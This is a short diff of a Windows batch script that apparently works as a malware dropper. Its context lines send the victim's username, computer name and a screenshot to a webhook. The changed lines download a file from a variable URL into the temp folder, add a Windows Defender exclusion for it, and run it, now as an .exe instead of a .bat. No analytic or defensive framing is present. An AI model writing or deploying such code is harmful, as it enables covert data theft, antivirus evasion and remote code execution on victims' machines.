@@ -4,6 +4,6 @@ if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Co
 
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```new viticm %username% - %computer% download %url%```\"}"  %webhook%
 curl -i -H 'Expect: application/json' -F file=@%cd%\screenshot.png %webhook%
-powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%temp%\file.bat'"
-powershell -Command "Add-MpPreference -ExclusionPath '%temp%\file.bat'"
-start %temp%\file.bat
+powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%temp%\file.exe'"
+powershell -Command "Add-MpPreference -ExclusionPath '%temp%\file.exe'"
+start %temp%\file.exe
